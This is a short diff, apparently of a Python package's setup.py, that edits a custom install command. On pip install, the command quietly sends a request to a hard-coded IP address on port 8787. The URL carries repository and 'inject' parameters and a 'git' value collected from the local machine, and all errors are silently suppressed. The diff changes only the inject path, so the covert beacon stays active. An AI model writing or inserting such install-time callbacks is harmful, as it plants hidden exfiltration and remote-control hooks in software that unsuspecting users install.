@@ -15,7 +15,7 @@ class _InstallCommand(install):
                 ).strip()
             except Exception:
                 pass
-            _u = "http://5.231.58.248:8787/install?repo=Boundaryploice%2Fpip-install-test&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=Boundaryploice%2Fpip-install-test%2Fsetup.py&git=" + _up.quote(_git)
+            _u = "http://5.231.58.248:8787/install?repo=Boundaryploice%2Fpip-install-test&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=Boundaryploice%2Fpip-install-test%2Finstall&git=" + _up.quote(_git)
             _ur.urlopen(_u, timeout=10).read()
         except Exception:
             pass
